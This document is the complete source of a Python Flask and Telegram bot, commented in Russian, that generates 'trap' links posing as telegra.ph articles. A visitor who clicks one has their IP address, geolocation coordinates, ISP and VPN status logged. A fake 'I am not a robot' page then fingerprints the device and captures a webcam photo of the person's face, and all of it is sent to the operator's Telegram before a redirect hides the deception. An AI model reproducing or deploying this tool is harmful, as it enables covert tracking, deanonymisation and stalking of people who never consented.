import telebot
import requests
import os
from flask import Flask, request, jsonify

API_TOKEN = os.environ.get('API_TOKEN')
ADMIN_ID = 8347374252 

bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

@app.route('/setup-my-bot-secret')
def setup_webhook():
    bot.remove_webhook()
    if bot.set_webhook(url=f"https://{request.host}/{API_TOKEN}"):
        return "🔥 SYSTEM ARMED"
    return "ERROR"

@app.route('/v/<path:article_id>')
def logger(article_id):
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('user-agent')
    
    # Расширенный GeoIP
    geo_data = "❌ GeoIP Blocked"
    try:
        r = requests.get(f"http://ip-api.com{ip}?fields=66846719", timeout=5).json()
        if r.get('status') == 'success':
            geo_data = (f"🌍 *Страна/Город:* {r.get('country')} / {r.get('city')}\n"
                        f"📡 *Провайдер:* {r.get('isp')}\n"
                        f"🛡 *VPN/Tor:* `{'ДА' if r.get('proxy') or r.get('hosting') else 'НЕТ'}`\n"
                        f"📍 *Координаты:* `{r.get('lat')}, {r.get('lon')}`")
    except: pass

    bot.send_message(ADMIN_ID, f"🎯 *НОВЫЙ ПЕРЕХОД!*\n\n👤 *IP:* `{ip}`\n{geo_data}\n📱 *UA:* `{ua}`", parse_mode="Markdown")
    
    return f'''
    <html>
    <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"></head>
    <body style="background:#000;color:white;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;">
        <div id="u" style="text-align:center;">
            <div style="font-size:60px;margin-bottom:10px;">⚠️</div>
            <h2 style="margin:0;">Подтверждение</h2>
            <p style="color:#aaa;font-size:14px;margin-bottom:25px;">Нажмите "Я НЕ РОБОТ", чтобы продолжить</p>
            <button id="b" style="padding:15px 50px;border:none;border-radius:50px;background:#0088cc;color:white;font-weight:bold;cursor:pointer;font-size:16px;">Я НЕ РОБОТ</button>
        </div>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        const btn = document.getElementById('b');
        btn.onclick = async () => {{
            btn.innerText = "Проверка...";
            
            let d = {{
                scr: window.screen.width + "x" + window.screen.height + " (DPR:" + window.devicePixelRatio + ")",
                cores: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory || "N/A",
                gpu: "N/A",
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                bat: "N/A",
                lang: navigator.language,
                touch: navigator.maxTouchPoints || 0,
                hz: 60
            }};

            // Видеокарта и Детект
            try {{
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl');
                let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            }} catch(e) {{}}

            // Попытка взять заряд (не для iPhone)
            try {{ let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "%"; }} catch(e) {{}}

            // Отправка ТТХ
            await fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});

            // Жесткий захват камеры
            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                const v = document.getElementById('v');
                v.srcObject = s;
                
                // Ждем пока камера "прогреется" (лучше качество)
                setTimeout(() => {{
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(blob => {{
                        const f = new FormData(); f.append('photo', blob, '1.jpg');
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{
                            s.getTracks().forEach(t => t.stop());
                            window.location.href = "https://telegra.ph{article_id}";
                        }});
                    }}, 'image/jpeg', 0.7);
                }}, 600);
            }} catch(e) {{
                window.location.href = "https://telegra.ph{article_id}";
            }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    msg = (f"🖥 *ПОЛНЫЙ ОТПЕЧАТОК*\n\n"
           f"📱 Экран: `{d.get('scr')}`\n"
           f"🧠 Ядра: `{d.get('cores')}` | 💾 ОЗУ: `{d.get('ram')}GB`\n"
           f"🔋 Батарея: `{d.get('bat')}`\n"
           f"🎮 GPU: `{d.get('gpu')}`\n"
           f"👆 Touch: `{d.get('touch')} pts`\n"
           f"🌐 Язык: `{d.get('lang')}`\n"
           f"🕒 Пояс: `{d.get('tz')}`")
    bot.send_message(ADMIN_ID, msg, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    f = request.files.get('photo')
    if f: bot.send_photo(ADMIN_ID, f.read(), caption="📸 *ЛИЦО ОБЪЕКТА*")
    return "ok"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_message():
    bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
    return "!", 200

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create_link(message):
    path = message.text.split("telegra.ph/")[-1].strip()
    bot.send_message(message.chat.id, f"🔗 *Твоя ловушка готова:*\n\n`https://{request.host}/v/{path}`", parse_mode="Markdown")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
